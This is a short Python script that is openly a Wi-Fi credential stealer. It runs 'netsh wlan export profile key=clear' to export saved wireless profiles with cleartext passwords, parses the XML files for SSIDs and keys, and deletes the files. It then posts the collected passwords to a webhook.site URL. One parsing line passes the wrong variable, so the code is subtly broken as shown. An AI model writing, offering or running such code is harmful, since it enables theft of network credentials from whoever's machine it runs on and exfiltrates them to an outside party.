from importlib.metadata import files
import subprocess, os, sys, requests 
import xml.etree.ElementTree as ET


#steaeler URL
url = 'https://webhook.site/your-key/'

#Lists & Dicts
wifi_files = []
payload = {"SSID":[], "Password":[]}

#Use Python to execute a Window command
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output= True).stdout.decode()

#Grab current directory
path = os.getcwd()

#Append Wi-Fi XML files to wifi files list
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)

#Parse Wi-Fi XML files        
for file in wifi_files:
    tree = ET.parse(files)
    root = tree.getroot()
    SSID = root[0].text
    password = root[4][0][1][2].text
    payload["SSID"].append(SSID)
    payload["Password"].append(password)
    os.remove(file)

#Send the hackies
payload_str = " & ".join("%s=%s" % (k,v) for k,v in payload.items())
r = requests.post(url, params='format=json', data=payload_str)
